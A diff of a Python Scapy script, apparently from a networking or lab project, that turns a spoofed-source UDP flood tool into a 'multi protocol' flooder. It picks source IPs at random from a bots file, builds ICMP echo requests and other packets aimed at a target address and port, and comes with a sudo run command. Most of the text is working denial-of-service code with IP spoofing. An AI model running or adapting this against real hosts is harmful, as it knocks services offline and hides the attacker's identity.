@@ -5,16 +5,13 @@ import time
 import sys
 import ipaddress
 
-# Ataque simples UDP Flood, sem payload.
-# IP Spoofing, RandomSRCPort e 3000 bots.
-
-# CONFIGURAÇÃO DO ATAQUE
+# Multi Protocol
 TARGET_IP = "192.168.100.2"
 TARGET_PORT = 50001
 BOTFILE = "bots.txt"
+NUM_PACKETS = 100
 
 def load_bots(filename):
-    """Colocar os bots do arquivo em uma lista."""
     bot_ips = []
 
     with open(filename, "r") as f:
@@ -26,8 +23,7 @@ def load_bots(filename):
 
     return bot_ips
 
-def run_udp_flood_attack():
-    """UDP Flood Attack"""
+def run_MULTI():
     bot_ips = load_bots(BOTFILE)
 
     numero_de_pacotes_enviados = 0
@@ -56,7 +52,7 @@ def run_udp_flood_attack():
             source_ip = random.choice(bot_ips)
             ip_layer = IP(src=source_ip, dst=TARGET_IP)
             eth_layer = Ether()
-            icmp_layer = ICMP(type=8, code=0)  # Echo Request, sem payload
+            icmp_layer = ICMP(type=8, code=0)  # Echo Request
             packet = eth_layer / ip_layer / icmp_layer
             lista_de_pacotes.append(packet)
             numero_de_pacotes_enviados += 1
@@ -71,7 +67,7 @@ def run_udp_flood_attack():
             lista_de_pacotes.append(packet)
             numero_de_pacotes_enviados += 1
 
-        if(numero_de_pacotes_enviados == 1000):
+        if(numero_de_pacotes_enviados == NUM_PACKETS):
             break
 
 
@@ -80,12 +76,11 @@ def run_udp_flood_attack():
     end_time = time.perf_counter()
     duration = end_time - start_time
 
-    print(f"\nEnvio concluído.")
-    print(f"Tempo total para enviar os pacotes: {duration:.4f} segundos")
-
+    print(f"\nSending completed.")
+    print(f"Total time to send packets: {duration:.4f} seconds")
 
 
 if __name__ == "__main__":
-    run_udp_flood_attack()
+    run_MULTI()
 
 # sudo PYTHONPATH=$HOME/scapy python3 multiprotocol.py
